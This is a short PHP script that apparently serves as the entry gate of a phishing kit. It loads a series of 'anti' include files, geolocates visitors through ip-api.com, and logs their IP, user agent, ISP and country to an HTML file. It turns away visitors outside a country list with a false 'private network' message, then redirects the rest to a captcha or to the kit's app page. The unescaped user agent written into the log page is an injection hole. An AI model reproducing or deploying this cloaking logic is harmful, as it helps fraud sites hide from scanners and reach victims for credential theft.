<?php 
include "prevents/anti1.php";
include "prevents/anti2.php";
include "prevents/anti3.php";
include "prevents/anti4.php";
include "prevents/anti5.php";
include "prevents/anti6.php";
include "prevents/anti7.php";
include "app/Config/panel.php";


$allowed = [
    //"IE",
    //"IT",
    //"MA",
    //"DE",
    //"FR",
    //"ES",
    //"AT",
    //"PT",
    //"QA",
    //"JP",
    //"RU"
];

$agent= $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];
function getIpInfo($ip = '') {
    $ipinfo = file_get_contents("http://ip-api.com/json/".$ip);
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}

$visitorip = $_SERVER['REMOTE_ADDR'];
$ipinfo_json = getIpInfo($visitorip);
    

    $status = $ipinfo_json['status'];
    $CountryCode = $ipinfo_json['countryCode'];
	$org = $ipinfo_json['as'];
	$isps = $ipinfo_json['isp'];
    $count = $ipinfo_json['country'];

    $date = date('Y-m-d H:i:s');


    $str = " <tr><th scope='row'>$ip</th><td>$agent</td><td>$date</td><td>$org</td><td>$count</td></tr>";
    file_put_contents('visitors.html', $str  , FILE_APPEND | LOCK_EX);

    if( $status == "success" ) {

    if( count($allowed) > 0 ) {

        if( !in_array($CountryCode,$allowed) ) {
            $_SESSION['MASTER'] = false;
            die("THE REQUEST WAS DENIED: MAKE SURE YOU ARE NOT CONNECTED TO A PRIVATE NETWORK." ); 
        }
    }

    if (CAPTCHA) {
        $_SESSION['VERIFIED'] = true;
        header("Location: verif.php?userid={$ue}&ue={$id}");
        exit();
    } else {
        $_SESSION['MASTER'] = true;
        header("Location: app/index.php?userid={$ue}&ue={$id}");
        exit();

    }



    }
    else {
        die('Failed to retrieve IP information.');
    }
?>